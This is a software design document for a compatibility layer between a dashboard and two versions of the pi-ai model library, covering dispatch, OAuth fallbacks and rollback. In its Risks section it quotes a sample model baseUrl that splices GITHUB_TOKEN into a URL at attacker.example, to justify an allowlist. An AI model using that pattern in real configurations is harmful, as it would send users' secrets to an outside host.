## Context

See `proposal.md` — Why. Every claim below was verified against the installed runtimes (0.75.5 in the repo tree, 0.86.1 under the global pi). ✅ = verified true. ❌ = a claim an earlier cycle of this design asserted and adversarial review **falsified**; it drives nothing now. Two review cycles inverted the stream-dispatch decision twice, so the falsified list is kept deliberately — it is the design's guard rail against a third inversion.

**Runtime facts (✅ verified):**
- `Model<TApi>` carries every field the registry projects; 0.86.1 only *adds* (`promptCache`, wider `compat`).
- `ProviderRequestOptions` accepts `apiKey` + `headers` (`types.d.ts:61,91`).
- `EventStream<T> implements AsyncIterable<T>` — no bridging iterator.
- `normalizeContext(context)` (`utils/transcript.js:23`) folds `context.systemPrompt` + `context.tools` into a leading system message and returns `{ messages }`. **`./utils/*` IS in the exports map** — this is a public entry point.
- `createProvider(...)`'s `provider.streamSimple` (`models.js:497`) dispatches **straight to the api implementation and resolves no auth**.
- `Models.streamSimple` (`models.js:392`) normalizes *and* calls `applyAuth` → `getAuth`.
- `resolveProviderAuth` (`auth/resolve.js:33`) short-circuits on an explicit `apiKey` **only when `provider.auth.apiKey` exists**.
- `dist/oauth.js` in 0.86.1 is `export {};` (44 bytes). Real loaders: `dist/auth/oauth/*.js`, exporting **async** `load<Provider>OAuth()` → `OAuthAuth` with `refresh(credential, signal)` over `{access, refresh, expires}`.
- 0.86.1 `exports` keys: `.`, `./compat`, `./providers/*`, `./api/*`, `./utils/*`, `./oauth`, `./bedrock-provider`, `./bun-oauth`. **`./auth/*` is absent.**
- `Api = KnownApi | (string & {})` — an **open** union. 11 `*.lazy.js` factories exist, with irregular names (`openAICodexResponsesApi`, `googleGenerativeAIApi`, `bedrockConverseStreamApi`). One of the 11 (`openrouterImagesApi`) returns `{generateImages}` — an images api, **not** a `ProviderStreams`; only 10 are text apis.
- **`builtinModels().getProviders()` returns `Provider` OBJECTS, not id strings** (measured: 41 objects with keys `id,name,baseUrl,headers,auth,getModels`). `getModels(providerObject)` returns **0**; `getModels("amazon-bedrock")` returns **159** (1443 models total across ids). The legacy `PiAiModule.getProviders()` contract is `() => string[]`.
- `@earendil-works/pi-ai/utils/transcript` resolves; `@earendil-works/pi-ai/utils/transcript.js` does **not** (`ERR_MODULE_NOT_FOUND` — the `./utils/*` pattern appends `.js`). 0.75.5 has **no** `./utils/*` export and no `dist/utils/transcript.js`.
- pi-ai is `"type": "module"`; every subpath load is an `await import()`.
- pi's own `ctx.modelRegistry` (available in the bridge) exposes `streamSimple`, and `ModelRuntime.streamSimple` already performs normalize → prepare → `provider.streamSimple`.
- 0.75.5 ships `dist/providers/*.js`; it does **not** ship `dist/api/`.
- `registerApiProvider` / `unregisterApiProviders` are referenced only by test mocks.

**Falsified (❌ — do not resurrect):**
- *"A pure module-shape remap."* Transcript normalization and OAuth relocation are semantic breaks in sibling entry points.
- *"Stream through the owning `Provider` alone."* (cycle 1) Skips `normalizeContext` → silently drops system prompt and tools.
- *"Stream through `Models.streamSimple`."* (cycle 2) **Reproduced failure:** `getAuth(openai-codex model, {apiKey})` → `undefined` → `applyAuth` throws `Provider is not configured`. OAuth-only providers break.
- *"`Models.streamSimple` injects github-copilot's credential-derived `baseUrl`."* Reproduced: with a caller key the short-circuit fires and `toAuth` never runs — `baseUrl` is `null` on **both** paths. No path delivers it; this is therefore not a differentiator and not a regression.
- *"0.86.1 removed `./package.json` from its exports map."* Neither version exports it; resolution survives only via `defaultResolveModule`'s dir-walk fallback.
- *"0.75.5 has no `dist/providers/`."* It does.
- *"Built-in providers are dynamic and need `refresh()`."* No 0.86.1 built-in provider defines `fetchModels`; `openrouter`/`opencode-go` are static. Only `radius` has `refreshModels`.

## Goals / Non-Goals

**Goals:**
- One declared seam absorbs all three pi-ai boundary breaks; `InternalRegistry` composition and every route handler stay untouched.
- The catalogue tracks whichever supported pi-ai is installed.
- Credential ownership unchanged: the dashboard resolves, pi-ai receives, the runtime's own store is never consulted.
- OAuth degradation is explicit, observable, and partial (api-key models keep working).

**Non-Goals:**
- Rewriting `InternalRegistry` onto `Models` semantics.
- Session-sourced `/api/models` (alternative A3).
- **Fixing the pre-existing `system:` vs `systemPrompt:` mismatch at `server.ts:2021`.** Proxy system prompts are already dropped today under 0.75.5. Repairing it turns them back on — a behavior change that must not ride a compatibility change. Asserted *unchanged* by test.
- Delivering github-copilot's token-derived `baseUrl` (no current path does; out of scope, recorded).
- Supporting pi-ai < 0.75.5; image-model and deferred-stream surfaces.

## Decisions

### D1 — One seam in `packages/shared`, three adaptations

`packages/shared/src/piai-compat/` exposes **`async adaptPiAi(...)`** returning the `PiAiModule` surface plus an OAuth facade. Not a pure remap: it adapts module shape (D2), stream dispatch + normalization (D3), and OAuth entry points (D7). The `PiAiModule` / `PiAiOAuthModule` type declarations move here from `packages/server/src/model-proxy/` and are re-exported for existing importers.

**The seam is async; the surface it returns is synchronous.** `PiAiModule.getProviders()`/`getModels()` are consumed synchronously by `InternalRegistry.getAllModels()`, but materializing the factory collection and the lazy-api factories requires `await import()` (pi-ai is ESM-only, and a static import in `shared` would bind the repo's own pinned copy rather than the resolved runtime — defeating the whole change). `adaptPiAi` therefore performs every async load **during construction** and hands back a fully-materialized synchronous surface. `registry-singleton` already awaits its resolution step, so this costs no new async boundary downstream.

**The adapted surface — not the raw module — is what gets cached.** `cachedPiAi` must hold the adapted object, or `getStreamSimpleFn()` returns `undefined` on a factory runtime and the proxy 503s with a healthy registry.

*Placement:* `packages/extension` depends on `shared` + `bus-client` only and sets `rootDir: src`, so a seam in `packages/server` makes D6 uncompilable.

### D2 — Full-shape detection, both markers positive

- **legacy** iff all seven global members are functions;
- **factory** iff `createModels` **and** `createProvider` are functions **and** no legacy member is present;
- otherwise **unrecognized** → reject naming the missing/conflicting members.

Both branches are positively identified; "not legacy ⇒ factory" is never inferred.

### D3 — Normalize in the seam, then dispatch at provider level (FINAL — third formulation)

```
transcript = normalizeContext(context)      // FACTORY BRANCH ONLY; fn taken from the
                                            // RESOLVED module (root export or derived
                                            // utils/transcript), never a bare specifier
streams = lazyApiFor(model.api)             // api-FIRST: the dispatch key is model.api
        ?? models.getProvider(model.provider)
streams.streamSimple(model, transcript, { ...callerOptions, apiKey, headers })
```

Four properties this encodes, each forced by a verified finding:

- **Normalization is factory-only.** 0.75.5's api implementations read `context.systemPrompt`/`context.tools` directly and its global `streamSimple` never normalized. Normalizing on the legacy branch would double-handle the prompt. The legacy branch passes `context` through untouched.
- **`normalizeContext` comes from the resolved module.** 0.75.5 ships no `./utils/*` export and no `dist/utils/transcript.js`, so a bare import breaks migration step 1 outright; and bare-importing from `shared` could bind a *different* pi-ai copy than the one the registry resolved — silently mixing generations. (Spelling note: the subpath is `utils/transcript`, not `utils/transcript.js`.)
- **Dispatch is api-first, and api-ONLY when the model names an api.** `InternalRegistry` deliberately retains a custom model authored under a built-in provider name. Resolving by provider first sends such a model into a built-in `Provider`, and `createProvider`'s **single-api** form ignores `model.api` entirely (`const apiFor = (model) => single ?? byApi?.[model.api]`) — so `cloudflare-workers-ai`, which IS single-api, would stream an `anthropic-messages` model through the **OpenAI-completions** api. 0.75.5 dispatched purely on `model.api`; api-only-when-named preserves that exactly. **Review-round-1 correction:** the originally-designed "owning built-in provider as fallback" was WRONG, because a fallback on an *unmapped* api IS that same silent misroute — it just reaches the wrong api through the provider's single slot instead of directly. An unmapped api now **throws** naming the api and the model (and the load failure when the api IS mapped but its module failed to load). The provider is consulted **only** when the model carries no `api` at all — no discriminator to route on. A model with no api AND an unknown provider fails diagnosably naming both.
- **Caller options pass through whole** (`signal`, `env`, `maxTokens`, …), with `apiKey`/`headers` applied last, so abort propagation and provider-env handling are not silently dropped.

*Why this and nothing else:* provider-level dispatch alone drops `systemPrompt`/`tools` (cycle-1 defect); `Models.streamSimple` throws for OAuth-only providers such as `openai-codex` (cycle-2 defect, reproduced). Calling `normalizeContext` ourselves and dispatching below the auth layer satisfies both: the transcript is folded exactly as `Models` would, and `getAuth` is never reached, so the empty credential store is irrelevant and the caller's `apiKey`/`headers` are the only credentials in play. This is also behavioural parity with 0.75.5, where the global `streamSimple` resolved no credentials either.

### D4 — Guarded `api` → lazy-module table; register nothing into the collection

Custom/synthetic models resolve a memoized `ProviderStreams` from `dist/api/<module>.lazy.js` through an **explicit** `model.api` → `{ module, exportName }` table (names are irregular). Nothing is registered into the built-in collection.

*Why not `setProvider`:* registering custom providers makes them visible to `piAi.getProviders()`, so `InternalRegistry.getAllModels()` would source them in the built-in pass and its dedup-keeps-first would discard the native `models.json` capability projection — breaking "composition unaffected".

*Table safety:* `Api` is an **open** union, so a compile-time exhaustiveness check is impossible. Instead a test asserts the table covers every **text-streaming** `*.lazy.js` factory the pinned runtime ships — explicitly excluding `openrouter-images.lazy.js`, whose factory returns `{generateImages}` (an images api with no `streamSimple`) and would false-fail a naive "every factory" diff. An unmapped `api` fails at dispatch with an error naming the api and the model — never a fallback.

### D5 — Path-safe, guarded subpath derivation

Derive siblings with `path` operations on the resolved module's directory (never a string regex), assert the basename is the expected entry file, probe each derived path before use, and fail with the resolved path in the message. Factory-only subpaths are probed **only** on the factory branch.

*Why:* `resolution.path` is native-separator (`path.join` / `fileURLToPath`), so a `/dist/index\.js$/` regex silently no-ops on Windows — a supported OS with VM smoke coverage. The same POSIX-only assumption exists today at `registry-singleton.ts:90` but is swallowed by a `catch`; this design must not promote it to a fatal error.

### D6 — Extension uses pi's own `ctx.modelRegistry` (RESOLVED — module-only mode dropped)

`bridge.ts` streams through **`ctx.modelRegistry.streamSimple(...)`**, pi's own fully-wired runtime, rather than adapting a bare-imported pi-ai module.

*Why the earlier module-only design is withdrawn:* its premise — "without a path the seam cannot reach subpaths" — is false (`./api/*`, `./providers/*`, `./utils/*` are all public exports on 0.86.1), but more decisively the 0.86.1 **root** entry exports no api implementations and no provider registry, so a module-only seam would have nothing to dispatch to. Meanwhile `ModelRuntime.streamSimple` already performs exactly D3's sequence (normalize → prepare → `provider.streamSimple`) with credentials pi has already resolved. Using it makes the extension's path shorter *and* removes a compat surface instead of adding one.

*Consequence:* the seam's `resolvedPath` parameter is no longer optional-by-necessity; only the server calls `adaptPiAi`, always with a path.

### D7 — OAuth capability facade, async, shape-translating

The seam supplies `InternalAuthStorage`'s OAuth dependency as a facade exposing **per-provider** availability (`isAvailable(providerId)`), not a single global boolean — the relocated loaders are a per-provider map, and the stated risk is one path moving, which a global flag cannot express. Resolution order per provider:
1. legacy `dist/oauth.js` **only if it actually exports the expected functions**;
2. else the relocated async loaders under `dist/auth/oauth/*.js` by derived path, behind a provider-id → loader map, translating `OAuthAuth.refresh(credential, signal)` / `{access, refresh, expires}` to the storage's `refreshToken(creds, signal)` / `{accessToken, refreshToken, expiresAt}` contract;
3. else `available: false`.

`InternalAuthStorage` gates on `isAvailable(providerId)`, not truthiness (today `if (!this.oauthModule)` passes for `{}` and then throws `TypeError`). Because the relocated loaders are **async** (`load<Provider>OAuth()`), the facade pre-loads them during `adaptPiAi` so the storage's existing synchronous `getOAuthProvider(id)` call shape survives; only the refresh path itself becomes async-aware. `PiAiOAuthModule` gains the `isAvailable` member, and `internal-auth-storage-refresh.test.ts` — which constructs that type directly — is updated with it.

*Trade-off (accepted, flagged as the design's weakest point):* `dist/auth/oauth/*` is outside the `exports` map and may move on any minor release. Mitigation: probe, never assume; degrade partially; assert the degraded shape in a test so a future move surfaces as a failed assertion rather than a `TypeError`.

### D8 — No catalogue refresh (REMOVED; was "dynamic-provider refresh")

Withdrawn. No 0.86.1 built-in provider defines `fetchModels`; `openrouter` and `opencode-go` ship static catalogues, and `models.refresh()` would be a credential-less no-op. The earlier requirement described a condition that does not exist. Custom-provider discovery continues to be driven solely by `InternalRegistry.discover()`, unchanged.

### D9 — Declare the pi-ai support window only

`docs/architecture.md`'s "no conditional code paths" statement is amended to record a two-generation pi-ai window served by **one declared seam**, and the pi-ai `peerDependencies` range is stated to match.

**`piCompatibility` is explicitly out of scope** — it is a `@earendil-works/pi-coding-agent` range in `packages/server/package.json`, a different artifact from the pi-ai pin. Touching it would break `pi-version-skew.test.ts`'s lockstep assertion for no reason.

## Risks / Trade-offs

- **`dist/auth/oauth/*` is a private path (D7)** → probe + `available` flag + partial degradation + `/api/health` visibility + a test pinning the degraded shape.
- **The `api`→module table cannot be exhaustively typed (D4)** → a test diffs the table against the runtime's shipped `*.lazy.js` set, so an upstream addition fails CI instead of silently falling through.
- **`normalizeContext` is re-implemented-by-call, not by copy** → if pi-ai changes normalization semantics, the seam inherits the change automatically; that is intended, and an integration test asserts prompt+tools arrive.
- **Two generations live simultaneously** (server pinned; extension always pi's own) → the seam is generation-agnostic; both branches are covered.
- **Rollback is not the pin alone** → the seam also replaces the legacy path (shape detection, OAuth probe). Reverting the pin restores the 0.75.5 *runtime*; restoring pre-change *code* means reverting the seam commit too. Both are recorded in the migration plan and in the proposal's Impact (the two must not disagree).
- **github-copilot enterprise `baseUrl`** → not delivered by any current path; explicitly out of scope, recorded so it is not mistaken for a regression of this change.
- **`options.env` / provider-injected auth headers (Cloudflare class)** → **RESOLVED at implementation time (task 1.11): this was a REGRESSION, not parity. The earlier "expected parity" claim is falsified.** Measured: in **0.75.5** the *api implementations themselves* resolved the placeholders — `providers/{openai-responses,openai-completions,anthropic}.js` call `resolveCloudflareBaseUrl(model)`, which substitutes `{VAR}` from **`process.env`**. In **0.86.1** that logic moved OUT of the api implementations into `cloudflareStreams` (`providers/cloudflare-stream.js`), a **provider-level** wrapper reading **`options.env`**, which only `Models.applyAuth` supplies. Since the dashboard supplies no `env` and dispatches api-first, **both** dispatch paths would leave `{CLOUDFLARE_ACCOUNT_ID}` / `{CLOUDFLARE_GATEWAY_ID}` literal in the request URL — a behaviour change for `cloudflare-workers-ai` / `cloudflare-ai-gateway`.
  *Mitigation (shipped, not deferred):* the seam substitutes `{VAR}` placeholders in `model.baseUrl` before dispatch, `options.env` first then ambient `process.env` — restoring 0.75.5's semantics for the real models. **Review-round-1 correction:** the substitution is **allowlisted to `CLOUDFLARE_ACCOUNT_ID` and `CLOUDFLARE_GATEWAY_ID`**, NOT a generic `{VAR}` scan. A generic scan of `process.env` would let any model's `baseUrl` — including one from a user-authored or discovered provider entry — splice an arbitrary secret into an outbound URL (`baseUrl: "https://attacker.example/{GITHUB_TOKEN}"`). Every built-in `baseUrl` containing a placeholder uses exactly those two names, so the allowlist is full parity for every real model. An unlisted or unresolvable (empty) placeholder is left **verbatim** rather than substituted — an empty substitution yields a malformed URL (`v1///compat`) that fails somewhere unrelated — and the caller's model object is never mutated. Pinned by `stream-dispatch.test.ts` → "baseUrl placeholders (task 1.11 regression)".
- **Silent-empty catalogue** → the `getProviders()` object-vs-string projection is the exact failure mode that produced the original bug (a `200` with a wrong catalogue). A test asserts a non-trivial built-in model **count**, not mere non-emptiness of the provider list.
- **The `system:`/`systemPrompt:` defect stays broken** → deliberate; a test asserts this change does not alter it.

## Migration Plan

1. Land `packages/shared/src/piai-compat/**` + tests while the pin is `^0.75.5`. The factory branch is tested against **fixtures plus an opt-in integration test** that is skipped when no ≥0.85 pi-ai is resolvable — so CI is green at step 1 without a 0.86.1 copy, and the local machine exercises the real module.
2. Wire `registry-singleton.ts`, `internal-auth-storage.ts` (capability gate + async refresh), `bridge.ts` (D6, after checking `ctx.modelRegistry`). Rewrite `pi-ai-shape.test.ts` against the seam. Full suite green on 0.75.5.
3. Bump the pin to `^0.86.1`; update the pi-ai `peerDependencies` range and `docs/architecture.md`. The step-1 integration test now runs unskipped in CI. Full suite green on 0.86.1.
4. Runtime verify: `/api/health.proxy: ready` + OAuth capability reported; `/api/models` contains `claude-opus-5` / `glm-5.3` / `deepseek-flash`; ★Favs resolves in Settings; one live streamed completion carrying a system prompt **and** a tool definition; one OAuth-provider refresh; one `openai-codex` (OAuth-only) completion.
5. **Rollback:** revert the pin + `pnpm install` + restart restores the 0.75.5 runtime. To restore pre-change code, revert the seam commit as well.

## Open Questions

- Whether `dashboard-plugin-runtime`'s `modelRuntime` seam needs its own test once it rides the adapter, or whether the proxy integration test covers it. Deferrable: same adapted `streamSimple`, no contract change.
